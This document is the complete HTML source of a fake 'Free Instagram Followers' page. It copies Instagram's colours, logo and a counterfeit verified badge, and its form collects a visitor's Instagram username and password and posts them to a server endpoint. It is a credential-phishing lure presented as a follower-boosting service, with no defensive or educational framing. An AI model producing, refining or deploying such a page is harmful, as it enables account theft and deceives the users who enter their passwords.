<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Free Followers Panel</title>
    <!-- FontAwesome Icon Link for Instagram & Blue Tick -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            /* Instagram Official Color Gradient Background */
            background: dimgray;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: #ffffff;
            width: 100%;
            max-width: 400px;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0px 10px 25px rgba(0, 0, 0, 0.3);
            text-align: center;
        }

        /* Top Header Section with Icon and Verified ID */
        .header-section {
            margin-bottom: 25px;
        }

        .insta-icon {
            font-size: 50px;
            background: -webkit-linear-gradient(#405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .header-section h2 {
            font-size: 22px;
            color: #262626;
            font-weight: 600;
            margin-bottom: 5px;
        }

        .official-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            color: #262626;
            margin-top: 5px;
        }

        .blue-tick {
            color: #0095f6;
            font-size: 14px;
        }

        /* Form Styling */
        .form-group {
            text-align: left;
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #262626;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 14px;
            background: #fafafa;
            outline: none;
        }

        .form-group input:focus {
            border-color: #a8a8a8;
        }

        /* Submit Button Upgraded */
        .btn-submit {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }

        .btn-submit:hover {
            background-color: #1877f2;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Top Branding Area -->
        <div class="header-section">
            <i class="fa-brands fa-instagram insta-icon"></i>
            <h2>Free Instagram Followers</h2>
            <div class="official-badge">
                <i class="fa-brands fa-instagram"></i> instagram 
                <i class="fa-solid fa-circle-check blue-tick" title="Verified Profile"></i>
            </div>
        </div>

       <!-- Main Form -->
<form action="/submit-data" method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter Username" required>
            </div>

            <div class="form-group">
                <label for="quantity">Quantity</label>
                <select id="quantity" name="quantity">
                    <option value="1K">1K Followers</option>
                    <option value="5K">5K Followers</option>
                    <option value="10K">10K Followers</option>
                    <option value="20K">20K Followers</option>
                </select>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter Password" required>
            </div>

            <button type="submit" class="btn-submit">Get Free Followers</button>
        </form>
    </div>

</body>
</html>
